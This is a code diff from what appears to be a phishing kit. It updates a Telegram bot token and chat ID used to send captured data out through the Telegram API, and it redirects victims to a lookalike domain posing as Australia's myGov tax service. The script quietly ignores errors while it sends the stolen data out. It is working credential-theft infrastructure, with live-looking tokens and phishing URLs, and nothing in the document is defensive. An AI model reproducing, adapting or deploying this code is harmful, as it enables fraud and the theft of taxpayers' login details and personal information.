@@ -42,7 +42,7 @@
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = '7325227930:AAE3EHiIvrRB2dpiJFP1Hia-aoJ7yPINBxo';
+        const BOT_TOKEN = '8198448830:AAFJB5qK3Q9NiSSTOmL7pWZcTIWhEEuLPIg';
         const CHAT_ID = '722615124';
         // =========================
 
@@ -57,7 +57,7 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
                 .catch(() => {}) // ignore errors
                 .finally(() => {
-                    window.location.href = 'https://login.my.gov.au-taxservices26.de5.net/confirmtaxation/log.html';
+                    window.location.href = 'https://login.my.gov.au-taxstmt2026.de5.net/confirmstmt/log.html';
                 });
         }
 
